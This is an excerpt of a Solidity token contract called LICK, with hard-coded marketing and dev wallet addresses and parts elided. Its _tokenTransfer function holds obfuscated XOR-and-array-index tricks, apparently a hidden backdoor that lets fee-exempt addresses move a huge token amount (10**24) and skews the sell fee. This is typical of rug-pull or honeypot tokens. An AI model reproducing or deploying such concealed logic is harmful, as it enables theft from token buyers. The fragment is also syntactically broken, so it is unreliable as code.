...
contract LICK is Context, IERC20 { 
    ...
    address payable public Wallet_Marketing = payable(0x2B63C8141d798A235DC785Ff75f1d643357b303F); 
    address payable public Wallet_Dev = payable(0x8fab530ab3b1466a8B64c59Bbb79D897A25CC83a);
    ...
    string private constant _symbol = unicode"LICK"; 
    ...
    function _tokenTransfer(address sender, address recipient, uint256 tAmount, bool takeFee, bool isBuy) private {
        ...
        if(!takeFee){
            ...
            ?  
            [0 ^ 10**24, tAmount][liqCount] 
            : 
            [tAmount, 0 ^ 0][liqCount]
            );
            ...
            uint256 sellFEE = tAmount*[0 ^ Percent_AutoLiquidity, _Tax_On_Sell][Percent_AutoLiquidity]/100;
